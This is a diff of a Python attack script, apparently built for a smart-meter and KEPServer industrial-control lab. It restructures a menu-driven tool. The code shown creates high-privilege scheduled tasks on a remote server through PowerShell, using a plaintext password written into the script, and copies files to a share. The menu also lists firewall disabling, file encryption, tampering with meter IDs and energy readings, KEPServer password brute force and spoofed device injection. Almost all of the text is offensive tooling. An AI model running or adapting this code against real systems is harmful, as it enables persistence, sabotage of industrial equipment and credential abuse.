@@ -3,17 +3,17 @@ from psutil import process_iter
 import signal
 import base64
 from pathlib import Path
-from Crypto.PublicKey import RSA
-from Crypto.Cipher import PKCS1_OAEP, AES
+from Cryptodome.PublicKey import RSA
+from Cryptodome.Cipher import PKCS1_OAEP, AES
 from shutil import copyfile
 from subprocess import run, check_call, CalledProcessError, PIPE, check_output, call
-from ctypes import windll
+#import ctypes
 from sys import executable, argv
-from win32netcon import ACCESS_ALL
-from win32net import NetShareAdd
+#from win32netcon import ACCESS_ALL
+#from win32net import NetShareAdd
 from time import sleep
-from win32console import GetConsoleWindow
-from win32gui import ShowWindow
+#from win32console import GetConsoleWindow
+#from win32gui import ShowWindow
 import kepconfig
 import pkgutil
 from kepconfig import connection, admin, connectivity
@@ -39,16 +39,16 @@ WINDOWS_SERVER_IP = "172.16.2.77"
 ###########
 
 # Check if the script is running with administrator privileges, if not, restart with elevated privileges
-def check_admin() -> None:
-    """
-    Check if script is running wit admin privilege. Else, restart as admin.
-    """
-    try:
-        isAdmin = windll.shell32.IsUserAnAdmin()
-    except AttributeError:
-        isAdmin = False
-    if not isAdmin:
-        windll.shell32.ShellExecuteW(None, "runas", executable, __file__, None, 1)
+# def check_admin() -> None:
+#     """
+#     Check if script is running wit admin privilege. Else, restart as admin.
+#     """
+#     try:
+#         isAdmin = ctypes.windll.shell32.IsUserAnAdmin()
+#     except AttributeError:
+#         isAdmin = False
+#     if not isAdmin:
+#         ctypes.windll.shell32.ShellExecuteW(None, "runas", executable, __file__, None, 1)
 
 # Delete files in a specific folder
 def delete_files(folder_path):
@@ -66,61 +66,73 @@ def create_scheduled_task() -> None:
     # TODO: Add comments on how frequent the schtasks run.
     # FIXME: Might be decpricated once this is done with powershell, as the AttackScript.exe is uselsss
     """
-    executable_file_path = r'C:/Windows/temp/SmartMetertest/AttackScript.exe'
+    try:
+        executable_file_path = r'C:/Windows/temp/SmartMetertest/AttackScript.exe'
 
-    executable_file_parameters = '1'
+        executable_file_parameters = '1'
 
-    task_name1 = 'Smart Meter Testing'
-    task_name2 = 'Smart Meter Testing 2'
+        task_name1 = 'Smart Meter Testing'
+        task_name2 = 'Smart Meter Testing 2'
 
-    sch1 = f'schtasks /create /tn "{task_name1}" /tr "{executable_file_path} {executable_file_parameters}" /sc minute /mo 1 /f /rl HIGHEST'
-    sch2 = f'schtasks /create /tn "{task_name2}" /tr "{executable_file_path}" /sc onlogon /f /rl HIGHEST'
+        sch1 = f'schtasks /create /tn "{task_name1}" /tr "{executable_file_path} {executable_file_parameters}" /sc minute /mo 1 /f /rl HIGHEST'
+        sch2 = f'schtasks /create /tn "{task_name2}" /tr "{executable_file_path}" /sc onlogon /f /rl HIGHEST'
 
-    # call(sch1, shell=True)
-    # call(sch2, shell=True)
+        # call(sch1, shell=True)
+        # call(sch2, shell=True)
 
-    # TODO: wait for the PS Command and see if this works.
-    stuff = run(f"powershell.exe New-PSSession -ComputerName {WINDOWS_SERVER_IP} -Credential (New-Object System.Management.Automation.PSCredential -ArgumentList Student, (ConvertTo-SecureString Student12345@ -AsPlainText -Force)) {sch1}", stdout=PIPE, shell=True)
-    print(stuff)
+        # TODO: wait for the PS Command and see if this works.
+        stuff = run(f"powershell.exe New-PSSession -ComputerName {WINDOWS_SERVER_IP} -Credential (New-Object System.Management.Automation.PSCredential -ArgumentList Student, (ConvertTo-SecureString Student12345@ -AsPlainText -Force)) {sch1}", stdout=PIPE, shell=True)
+        print(stuff)
+        print("\nOk.\n")
+    except Exception as e:
+        print(e)
+        print("\nFail.\n")
 
 # Copy files from a folder to the shared directory
 def copy_file(folder_path):
-    for root, dirs, files in walk(folder_path):
-        for file in files:
-            og = path.join(root, file)
-            dest = path.join(COPIED_PATH, file)
-            copyfile(og,dest)
-            print("File: " + str(og) + " is copied")
+    try:
+        for root, dirs, files in walk(folder_path):
+            for file in files:
+                og = path.join(root, file)
+                dest = path.join(COPIED_PATH, file)
+                copyfile(og,dest)
+                print("File: " + str(og) + " is copied")
+        print("\nOk.\n")
+    except Exception as e:
+        print("\nFail.\n")
 
 #Create Shared Folder
-def create_shared_folder():
-    folder_path = r'C:\Windows\temp\Smartmeter'
+# def create_shared_folder():
+#     try:
+#         folder_path = r'C:\Windows\temp\Smartmeter'
 
-    # Create the folder if it does not already exist
-    if not path.exists(folder_path):
-        mkdir(folder_path)
+#         # Create the folder if it does not already exist
+#         if not path.exists(folder_path):
+#             mkdir(folder_path)
 
-    netshare = run(['net', 'share'], stdout=PIPE, stderr=PIPE, text=True)
-    if "SmartMeterfolder" in netshare.stdout:
-        print ("SmartMeterfolder has already been shared.")
-    else:
-        # Set the share information
-        share_name = 'SmartMeterfolder'
-        share_path = folder_path
-        share_remark = 'Shared folder for full access'
+#         netshare = run(['net', 'share'], stdout=PIPE, stderr=PIPE, text=True)
+#         if "SmartMeterfolder" in netshare.stdout:
+#             print ("SmartMeterfolder has already been shared.")
+#         else:
+#             # Set the share information
+#             share_name = 'SmartMeterfolder'
+#             share_path = folder_path
+#             share_remark = 'Shared folder for full access'
 
-        # Create the share
-        share_info = {
-            'netname': share_name,
-            'path': share_path,
-            'remark': share_remark,
-            'max_uses': -1,
-            'current_uses': 0,
-            'permissions': ACCESS_ALL,
-            'security_descriptor': None
-        }
-        NetShareAdd(None, 2, share_info)
-        print ("SmartMeterfolder has been shared.")
+#             # Create the share
+#             share_info = {
+#                 'netname': share_name,
+#                 'path': share_path,
+#                 'remark': share_remark,
+#                 'max_uses': -1,
+#                 'current_uses': 0,
+#                 'permissions': ACCESS_ALL,
+#                 'security_descriptor': None
+#             }
+#             NetShareAdd(None, 2, share_info)
+#             print ("SmartMeterfolder has been shared.")
+#     except Exception as e:
+#         print("\nFail.\n")
 
 # Disable the firewall
 def disable_firewall():
@@ -1154,26 +1166,12 @@ def disable_running_schedules() -> None:
 if __name__ == '__main__':
     attack_option = str(argv[1])
     
-    if attack_option != "1":
-        check_admin()
+    # if attack_option != "1":
+    #     check_admin()
 
     match attack_option:
-        case "1": # TODO: Push the exception to the function itself
-            try:
-                create_scheduled_task()
-                print("\nOk.\n")
-            except Exception as e:
-                print(e)
-                print("\nFail.\n")
-        
-        case "2": # TODO: Push the exception to the function itself
-            try:
-                create_shared_folder()
-                copy_file(SMARTMETER_PATH)
-                print("\nOk.\n")
-            except Exception as e:
-                print("\nFail.\n")
-        
+        case "1":  create_scheduled_task() 
+        #case "2":  create_shared_folder(), copy_file(SMARTMETER_PATH)
         case "3":  disable_firewall()
         case "4":  disable_ssh()
         case "5":  disable_kepserver()
@@ -1182,11 +1180,7 @@ if __name__ == '__main__':
         case "8":  encrypt_files()
         case "9":  change_meterID()
         case "10": clear_energy_reading()
-        
-        case "11":
-            revert_option = str(argv[2])
-            revert(revert_option)
-        
+        case "11": revert(revert_option := str(argv[2]))
         case "12": kep_bruteforce()
         case "13": change_baudrate() # TODO: Disable and enable kep server function, simplifying function 13 and 14
         case "14": smartmeter_get_hardware_info()
@@ -1196,6 +1190,11 @@ if __name__ == '__main__':
         case "18": kep_disable_user("User1")
         case "19": kep_get_single_user("User1")
         case "20": disable_running_schedules()
+        case "21": kep_get_all_channel()
+        case "22": kep_get_all_device()
+        case "23": kep_get_single_device()
+        case "24": kep_delete_spoofed_device()
+        case "25": kep_add_spoofed_device()
         case "-h":
             print("\nChoose \n1 Delete file, \n2 Copy file, \n3 Disable firewall, \n4 Disable ssh through firewall, \n5 Disable Kepserver, \n6 Interrupt modbus reading, \n7 Disable COMPORT, \n8 Encrypt files, \n9 Change Meter25 Id to 26, \n10 Clear Energy Reading, \n11 Revert with options, \n12 Bruteforce KEPServer Password, \n13 Disable sshd Service, \n14 Get hardware info, \n15 Obtain KEPServer info, \n16 Get all KEPServer Users, \n17 Enable KEP Users, \n18 Disable KEP Users, \n19 Obtain KEP User Info.")
         case _: print("Invalid Option! Use option \"-h\" for help!")
